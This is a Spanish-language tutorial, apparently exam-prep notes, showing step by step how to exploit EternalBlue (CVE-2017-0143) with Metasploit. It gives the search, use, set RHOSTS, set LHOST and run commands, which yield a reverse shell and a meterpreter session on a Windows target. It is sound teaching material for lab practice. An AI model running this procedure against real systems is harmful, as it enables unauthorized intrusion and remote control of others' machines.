
---
- TAG: #Introducción #Metasploit #EternalBlue #Windows 
----
# Explotación de Vulnerabilidades

En este apartado, vamos a enseñar un poco sobre la **Explotación de vulnerabilidades**, ingresando a una máquina utilizando alguna vulnerabilidad visible.

## Abrir Metasploit

Primero, debemos abrir nuestra aplicación de Metasploit de manera manual desde las aplicaciones de Kali Linux para que se ejecute correctamente.

## Buscar la Vulnerabilidad

Una vez abierta, podemos buscar la vulnerabilidad con el comando:

```bash
search CVE-2017-0143
```

O simplemente ingresando el nombre de la vulnerabilidad:

```bash
search eternalblue
```


Obtendremos la misma respuesta con varias opciones, y será cuestión de probar hasta que una de ellas funcione.

## Seleccionar el Exploit

Para utilizar el exploit que necesitemos, lo seleccionamos con la palabra `use` seguido del número del exploit:

```msf6
msf6 > use 0
```


## Ver las Opciones de Configuración

Una vez seleccionado, es muy importante ver sus opciones de configuración con:

```bash
show options
```


Debemos tener claro que dentro del exploit existe el payload, que contiene la carga útil que se ejecutará automáticamente al ingresar a la máquina, otorgándonos una reverse shell como atacantes.

## Configurar la Dirección IP

En la parte de la dirección IP, notaremos que es obligatorio asignarla. Para ello, debemos usar el siguiente comando:

```bash
set RHOSTS 1.2.3.4
```


Luego de asignar la dirección de nuestra máquina víctima, podemos verificarlo nuevamente haciendo un `show options`.

## Asignar el Puerto

También es necesario asignar el puerto, pero generalmente este exploit se ejecuta por el puerto `445`.

## Configurar el Payload

Debemos asegurarnos de que en el payload nuestro **LHOST** tenga asignada nuestra dirección IP, ya que es crucial para conseguir la reverse shell.

Si en el examen no les aparece, pueden asignarlo con la función `set LHOST`.

## Ejecutar el Exploit

Para ponerlo en marcha, simplemente debemos hacer un `run` o `exploit`.

```msfconsole
run
```


Si todo va bien, deberíamos estar dentro de la máquina y nos aparecerá un **meterpreter** por consola. Es importante saber lo básico en comandos de Windows como: `pwd`, `dir`, `mkdir`, `cd`, etc.

Regresamos con `cd ..` hasta la parte donde podemos ver los Usuarios y poder ingresar a la carpeta **Desktop** y crear un archivo para confirmar que estamos dentro de la máquina:

```metasploit
meterpreter > mkdir Hacked!
```


Y listo, chicos. De esta manera se explotaría una vulnerabilidad de manera simple y sencilla.

## Recomendaciones

Lo único que cambiará son los parámetros que vayamos a utilizar. Recomiendo mucho aprender un poco de `cmd` y comandos de `metasploit`.

